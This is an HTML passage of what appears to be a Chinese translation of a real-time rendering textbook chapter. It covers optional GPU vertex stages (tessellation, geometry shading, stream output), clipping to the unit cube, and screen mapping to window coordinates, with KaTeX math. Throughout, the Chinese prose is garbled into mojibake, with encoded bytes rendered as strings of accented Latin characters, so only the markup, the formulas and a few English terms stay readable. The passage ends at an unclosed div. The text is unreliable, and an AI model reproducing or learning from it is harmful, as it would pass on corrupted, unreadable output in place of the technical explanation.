<p>å°½ç®¡è¿™äº›çŸ©é˜µå°†ä¸€ä¸ªå‡ ä½•ä½“è½¬æ¢ä¸ºå¦ä¸€ä¸ªå‡ ä½•ä½“ï¼Œä½†å®ƒä»¬è¢«ç§°ä¸ºæŠ•å½±ï¼Œå› ä¸ºåœ¨æ˜¾ç¤ºä¹‹åï¼Œzåæ ‡ä¸å­˜å‚¨åœ¨ç”Ÿæˆçš„å›¾åƒä¸­ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨zç¼“å†²åŒºä¸­ï¼Œå¦‚<a href="https://link.juejin.cn?target=%25E7%25AC%25AC2.5%25E8%258A%2582" target="_blank" title="%E7%AC%AC2.5%E8%8A%82" ref="nofollow noopener noreferrer">ç¬¬2.5èŠ‚</a>æ‰€è¿°ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ¨¡å‹ä»ä¸‰ç»´æŠ•å½±åˆ°ä¸¤ç»´ã€‚</p>
<h5 data-id="heading-4">2.3.2 å¯é€‰çš„é¡¶ç‚¹å¤„ç†</h5>
<p>æ¯ä¸ªç®¡çº¿éƒ½æœ‰åˆšåˆšæè¿°çš„é¡¶ç‚¹å¤„ç†ã€‚å®Œæˆæ­¤å¤„ç†åï¼Œå¯ä»¥åœ¨GPUä¸Šè¿›è¡Œå‡ ä¸ªå¯é€‰é˜¶æ®µï¼ŒæŒ‰é¡ºåºæ˜¯ï¼šæ›²é¢ç»†åˆ†ã€å‡ ä½•ç€è‰²å’Œæµè¾“å‡ºã€‚å®ƒä»¬çš„ä½¿ç”¨å–å†³äºç¡¬ä»¶çš„èƒ½åŠ›â€”â€”å¹¶éæ‰€æœ‰ GPU éƒ½æœ‰å®ƒä»¬â€”â€”ä»¥åŠç¨‹åºå‘˜çš„æ„¿æœ›ã€‚å®ƒä»¬ç›¸äº’ç‹¬ç«‹ï¼Œä¸€èˆ¬ä¸å¸¸ç”¨ã€‚ å°†åœ¨<a href="https://link.juejin.cn?target=%25E7%25AC%25AC3%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC3%E7%AB%A0" ref="nofollow noopener noreferrer">ç¬¬3ç« </a>ä¸­è¯¦ç»†ä»‹ç»æ¯ä¸€ä¸ªã€‚</p>
<p>ç¬¬ä¸€ä¸ªå¯é€‰é˜¶æ®µæ˜¯æ›²é¢ç»†åˆ†ã€‚å‡è®¾ä½ æœ‰ä¸€ä¸ªå¼¹è·³çƒå¯¹è±¡ã€‚å¦‚æœç”¨ä¸€ç»„ä¸‰è§’å½¢è¡¨ç¤ºå®ƒï¼Œåˆ™å¯èƒ½ä¼šé‡åˆ°è´¨é‡æˆ–æ€§èƒ½é—®é¢˜ã€‚æ‚¨çš„çƒåœ¨5ç±³å¤–å¯èƒ½çœ‹èµ·æ¥ä¸é”™ï¼Œä½†è¿‘è·ç¦»è§‚å¯Ÿå•ä¸ªä¸‰è§’å½¢ï¼Œä¸‰è§’å½¢çš„è½®å»“ï¼Œå°±ä¼šå˜å¾—æ¸…æ™°å¯è§ã€‚å¦‚æœä½ ç”¨æ›´å¤šçš„ä¸‰è§’å½¢åˆ¶ä½œçƒæ¥æé«˜è´¨é‡ï¼Œå½“çƒå¾ˆè¿œå¹¶ä¸”åªè¦†ç›–å±å¹•ä¸Šçš„å‡ ä¸ªåƒç´ æ—¶ï¼Œä½ å¯èƒ½ä¼šæµªè´¹å¤§é‡çš„å¤„ç†æ—¶é—´å’Œå†…å­˜ã€‚é€šè¿‡æ›²é¢ç»†åˆ†ï¼Œå¯ä»¥ä½¿ç”¨é€‚å½“æ•°é‡çš„ä¸‰è§’å½¢ç”Ÿæˆæ›²é¢ã€‚</p>
<p>æˆ‘ä»¬å·²ç»è®¨è®ºäº†ä¸€äº›ä¸‰è§’å½¢ï¼Œä½†åœ¨ç®¡çº¿ä¸­çš„è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä»¬åªå¤„ç†äº†é¡¶ç‚¹ã€‚è¿™äº›å¯ç”¨äºè¡¨ç¤ºç‚¹ã€çº¿ã€ä¸‰è§’å½¢æˆ–å…¶ä»–å¯¹è±¡ã€‚é¡¶ç‚¹å¯ç”¨äºæè¿°æ›²é¢ï¼Œä¾‹å¦‚çƒã€‚è¿™æ ·çš„è¡¨é¢å¯ä»¥ç”±ä¸€ç»„é¢ç‰‡æŒ‡å®šï¼Œæ¯ä¸ªé¢ç‰‡ç”±ä¸€ç»„é¡¶ç‚¹ç»„æˆã€‚æ›²é¢ç»†åˆ†é˜¶æ®µç”±ä¸€ç³»åˆ—é˜¶æ®µæœ¬èº«ç»„æˆâ€”â€”å¤–åŒ…ç€è‰²å™¨(hull shader)ã€æ›²é¢ç»†åˆ†å™¨(tessellator)å’ŒåŸŸç€è‰²å™¨(domain shader)â€”â€”å°†è¿™äº›é¢ç‰‡é¡¶ç‚¹é›†è½¬æ¢ä¸ºï¼ˆé€šå¸¸ï¼‰æ›´å¤§çš„é¡¶ç‚¹é›†ï¼Œç„¶åç”¨äºåˆ¶ä½œæ–°çš„ä¸‰è§’å½¢é›†ã€‚åœºæ™¯çš„ç›¸æœºå¯ç”¨äºç¡®å®šç”Ÿæˆäº†å¤šå°‘ä¸ªä¸‰è§’å½¢ï¼šé¢ç‰‡å¾ˆè¿‘æ—¶å¾ˆå¤šï¼Œè¿œå¤„æ—¶å¾ˆå°‘ã€‚</p>
<p>ä¸‹ä¸€ä¸ªå¯é€‰é˜¶æ®µæ˜¯å‡ ä½•ç€è‰²å™¨ã€‚è¯¥ç€è‰²å™¨æ—©äºæ›²é¢ç»†åˆ†ç€è‰²å™¨ï¼Œå› æ­¤åœ¨GPUä¸Šæ›´å¸¸è§ã€‚å®ƒç±»ä¼¼äºæ›²é¢ç»†åˆ†ç€è‰²å™¨ï¼Œå› ä¸ºå®ƒæ¥å—å„ç§ç±»å‹çš„å›¾å…ƒå¹¶å¯ä»¥ç”Ÿæˆæ–°çš„é¡¶ç‚¹ã€‚è¿™æ˜¯ä¸€ä¸ªæ›´ç®€å•çš„é˜¶æ®µï¼Œå› ä¸ºæ­¤åˆ›å»ºçš„èŒƒå›´æœ‰é™ï¼Œè¾“å‡ºå›¾å…ƒçš„ç±»å‹ä¹Ÿæ›´æœ‰é™ã€‚å‡ ä½•ç€è‰²å™¨æœ‰å¤šç§ç”¨é€”ï¼Œå…¶ä¸­æœ€æµè¡Œçš„ä¸€ç§æ˜¯ç²’å­ç”Ÿæˆã€‚æƒ³è±¡ä¸€ä¸‹æ¨¡æ‹ŸçƒŸèŠ±çˆ†ç‚¸ã€‚æ¯ä¸ªç«çƒéƒ½å¯ä»¥ç”¨ä¸€ä¸ªç‚¹æ¥è¡¨ç¤ºï¼Œä¸€ä¸ªé¡¶ç‚¹ã€‚å‡ ä½•ç€è‰²å™¨å¯ä»¥å°†æ¯ä¸ªç‚¹å˜æˆé¢å‘è§‚å¯Ÿè€…å¹¶è¦†ç›–å¤šä¸ªåƒç´ çš„æ­£æ–¹å½¢ï¼ˆç”±ä¸¤ä¸ªä¸‰è§’å½¢ç»„æˆï¼‰ï¼Œä»è€Œä¸ºæˆ‘ä»¬æä¾›æ›´ä»¤äººä¿¡æœçš„å›¾å…ƒè¿›è¡Œç€è‰²ã€‚</p>
<p>æœ€åä¸€ä¸ªå¯é€‰é˜¶æ®µç§°ä¸ºæµè¾“å‡ºã€‚è¿™ä¸ªé˜¶æ®µè®©æˆ‘ä»¬ä½¿ç”¨GPUä½œä¸ºå‡ ä½•å¼•æ“ã€‚ä¸å°†æˆ‘ä»¬å¤„ç†è¿‡çš„é¡¶ç‚¹æ²¿ç€ç®¡é“çš„å…¶ä½™éƒ¨åˆ†å‘é€åˆ°å±å¹•ä¸Šä¸åŒï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€‰æ‹©å°†è¿™äº›é¡¶ç‚¹è¾“å‡ºåˆ°æ•°ç»„ä¸­ä»¥ä¾›è¿›ä¸€æ­¥å¤„ç†ã€‚è¿™äº›æ•°æ®å¯ä»¥ç”±CPUæˆ–GPUæœ¬èº«åœ¨ä»¥åçš„è¿‡ç¨‹ä¸­ä½¿ç”¨ã€‚æ­¤é˜¶æ®µé€šå¸¸ç”¨äºç²’å­æ¨¡æ‹Ÿï¼Œä¾‹å¦‚æˆ‘ä»¬çš„çƒŸèŠ±ç¤ºä¾‹ã€‚</p>
<p>è¿™ä¸‰ä¸ªé˜¶æ®µæŒ‰æ­¤é¡ºåºæ‰§è¡Œâ€”â€”æ›²é¢ç»†åˆ†ã€å‡ ä½•ç€è‰²å’Œæµè¾“å‡ºâ€”â€”æ¯ä¸ªé˜¶æ®µéƒ½æ˜¯å¯é€‰çš„ã€‚æ— è®ºä½¿ç”¨å“ªä¸ªï¼ˆå¦‚æœæœ‰ï¼‰é€‰é¡¹ï¼Œå¦‚æœæˆ‘ä»¬ç»§ç»­æ²¿ç€ç®¡é“å‘ä¸‹èµ°ï¼Œæˆ‘ä»¬å°±ä¼šå¾—åˆ°ä¸€ç»„å…·æœ‰é½æ¬¡åæ ‡çš„é¡¶ç‚¹ï¼Œè¿™äº›é¡¶ç‚¹å°†è¢«æ£€æŸ¥ç›¸æœºæ˜¯å¦èƒ½çœ‹åˆ°å®ƒä»¬ã€‚</p>
<h5 data-id="heading-5">2.3.3 è£å‰ª</h5>
<p>åªæœ‰å…¨éƒ¨æˆ–éƒ¨åˆ†åœ¨è§†å›¾ä½“å†…éƒ¨çš„å›¾å…ƒéœ€è¦ä¼ é€’åˆ°å…‰æ …åŒ–é˜¶æ®µï¼ˆä»¥åŠéšåçš„åƒç´ å¤„ç†é˜¶æ®µï¼‰ï¼Œç„¶ååœ¨å±å¹•ä¸Šç»˜åˆ¶å®ƒä»¬ã€‚å®Œå…¨ä½äºè§†å›¾ä½“å†…éƒ¨çš„å›¾å…ƒå°†æŒ‰åŸæ ·ä¼ é€’åˆ°ä¸‹ä¸€ä¸ªé˜¶æ®µã€‚å®Œå…¨åœ¨è§†å›¾ä½“ç§¯ä¹‹å¤–çš„åŸºå…ƒä¸ä¼šè¢«è¿›ä¸€æ­¥ä¼ é€’ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰è¢«æ¸²æŸ“ã€‚éƒ¨åˆ†ä½äºè§†å›¾ä½“å†…éƒ¨çš„å›¾å…ƒéœ€è¦è£å‰ªã€‚ä¾‹å¦‚ï¼Œä¸€æ¡ç›´çº¿ï¼Œåœ¨è§†å›¾ä½“å¤–éƒ¨æœ‰ä¸€ä¸ªé¡¶ç‚¹ï¼Œåœ¨è§†å›¾ä½“ç§¯å†…éƒ¨æœ‰ä¸€ä¸ªé¡¶ç‚¹ï¼Œæ­¤æ—¶åº”è¯¥æ ¹æ®è§†å›¾ä½“å¯¹å…¶è¿›è¡Œè£å‰ªï¼›ä»¥ä¾¿å¤–éƒ¨çš„é¡¶ç‚¹è¢«ä½äºè¯¥çº¿å’Œè§†å›¾ä½“ä¹‹é—´çš„äº¤ç‚¹å¤„çš„æ–°é¡¶ç‚¹æ›¿æ¢ã€‚æŠ•å½±çŸ©é˜µçš„ä½¿ç”¨æ„å‘³ç€å˜æ¢åçš„å›¾å…ƒè¢«è£å‰ªåˆ°å•ä½ç«‹æ–¹ä½“ä¸Šã€‚åœ¨è£å‰ªä¹‹å‰è¿›è¡Œè§†å›¾å˜æ¢å’ŒæŠ•å½±çš„å¥½å¤„æ˜¯å¯ä»¥ä½¿è£å‰ªé—®é¢˜ä¿æŒä¸€è‡´ï¼›å›¾å…ƒæ€»æ˜¯é’ˆå¯¹å•ä½ç«‹æ–¹ä½“è¿›è¡Œè£å‰ªã€‚</p>
<p>è£å‰ªè¿‡ç¨‹å¦‚å›¾2.6æ‰€ç¤ºã€‚é™¤äº†è§†å›¾ä½“ç§¯çš„å…­ä¸ªå‰ªè£å¹³é¢ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥å®šä¹‰é¢å¤–çš„å‰ªè£å¹³é¢æ¥æ˜æ˜¾åœ°å‰ªè£å¯¹è±¡ã€‚ç¬¬818é¡µçš„å›¾19.1ä¸­æ˜¾ç¤ºäº†æ˜¾ç¤ºè¿™ç§å¯è§†åŒ–ç±»å‹çš„å›¾åƒï¼Œç§°ä¸ºå‰–è§†(sectioning)ã€‚</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/36303ce988584f24a3a6e56e725a1366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085680&amp;x-orig-sign=F5bHMGs4QsbJNDcKDMQwCBidCEU%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>å›¾2.6. åªéœ€è¦å•ä½ç«‹æ–¹ä½“å†…éƒ¨çš„å›¾å…ƒï¼ˆå¯¹åº”è§†é”¥ä½“å†…éƒ¨çš„å›¾å…ƒï¼‰ç»§ç»­å¤„ç†ã€‚å› æ­¤ï¼Œå•ä½ç«‹æ–¹ä½“å¤–é¢çš„å›¾å…ƒè¢«ä¸¢å¼ƒï¼Œè€Œå®Œå…¨åœ¨é‡Œé¢çš„å›¾å…ƒè¢«ä¿ç•™ã€‚ä¸å•ä½ç«‹æ–¹ä½“ç›¸äº¤çš„å›¾å…ƒè¢«è£å‰ªåœ¨å•ä½ç«‹æ–¹ä½“ä¸Šï¼Œä»è€Œäº§ç”Ÿæ–°çš„é¡¶ç‚¹å¹¶ä¸¢å¼ƒæ—§çš„é¡¶ç‚¹ã€‚</p>
</div>
<p>è£å‰ªæ­¥éª¤ä½¿ç”¨æŠ•å½±äº§ç”Ÿçš„4å€¼é½æ¬¡åæ ‡è¿›è¡Œè£å‰ªã€‚å€¼é€šå¸¸ä¸ä¼šè·¨é€è§†ç©ºé—´ä¸­çš„ä¸‰è§’å½¢è¿›è¡Œçº¿æ€§æ’å€¼ã€‚éœ€è¦ç¬¬å››ä¸ªåæ ‡ï¼Œä»¥ä¾¿åœ¨ä½¿ç”¨é€è§†æŠ•å½±æ—¶æ­£ç¡®æ’å…¥å’Œè£å‰ªæ•°æ®ã€‚æœ€åï¼Œæ‰§è¡Œé€è§†é™¤æ³•ï¼Œå°†ç”Ÿæˆçš„ä¸‰è§’å½¢çš„ä½ç½®æ”¾å…¥ä¸‰ç»´æ ‡å‡†åŒ–è®¾å¤‡åæ ‡ä¸­ã€‚å¦‚å‰æ‰€è¿°ï¼Œæ­¤è§†å›¾ä½“ç§¯èŒƒå›´ä»<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-1,-1,-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">âˆ’</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">âˆ’</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>åˆ°<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>ã€‚å‡ ä½•é˜¶æ®µçš„æœ€åä¸€æ­¥æ˜¯ä»è¿™ä¸ªç©ºé—´è½¬æ¢åˆ°çª—å£åæ ‡ã€‚</p>
<h5 data-id="heading-6">2.3.4 å±å¹•æ˜ å°„</h5>
<p>åªæœ‰è§†å›¾ä½“å†…éƒ¨çš„ï¼ˆè£å‰ªçš„ï¼‰å›¾å…ƒè¢«ä¼ é€’åˆ°å±å¹•æ˜ å°„é˜¶æ®µï¼Œè¿›å…¥è¿™ä¸ªé˜¶æ®µæ—¶åæ ‡ä»ç„¶æ˜¯ä¸‰ç»´çš„ã€‚æ¯ä¸ªå›¾å…ƒçš„xå’Œyåæ ‡è¢«è½¬æ¢ä¸ºå±å¹•åæ ‡ã€‚å±å¹•åæ ‡ä¸zåæ ‡ä¸€èµ·ä¹Ÿç§°ä¸ºçª—å£åæ ‡ã€‚å‡è®¾åœºæ™¯åº”è¯¥è¢«æ¸²æŸ“åˆ°ä¸€ä¸ªæœ€å°ä½ç½®åœ¨<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1,y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>ï¼Œæœ€å¤§ä½ç½®åœ¨<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_2 ,y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>å¤„çš„çª—å£ï¼ˆå…¶ä¸­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>&lt;</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_1 &lt; x_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>å’Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo>&lt;</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_1 &lt; y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼‰ã€‚å±å¹•æ˜ å°„å…ˆæ˜¯å¹³ç§»ï¼Œç„¶åæ˜¯ç¼©æ”¾æ“ä½œã€‚æ–°çš„xå’Œyåæ ‡ç§°ä¸ºå±å¹•åæ ‡ã€‚zåæ ‡ï¼ˆOpenGLçš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[âˆ’1,+1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">+</span><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>å’ŒDirectXçš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>ï¼‰ä¹Ÿè¢«æ˜ å°„åˆ°<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>z</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>z</mi><mn>2</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[z_1,z_2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span>ï¼Œå…¶ä¸­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">z_1=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span>å’Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>2</mn></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">z_2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ä½œä¸ºé»˜è®¤å€¼ã€‚ä½†æ˜¯ï¼Œè¿™äº›å¯ä»¥é€šè¿‡APIè¿›è¡Œæ›´æ”¹ã€‚çª—å£åæ ‡è¿åŒè¿™ä¸ªé‡æ–°æ˜ å°„çš„zå€¼è¢«ä¼ é€’åˆ°å…‰æ …åŒ–é˜¶æ®µã€‚å±å¹•æ˜ å°„è¿‡ç¨‹å¦‚å›¾2.7æ‰€ç¤ºã€‚</p>
<div align="center">
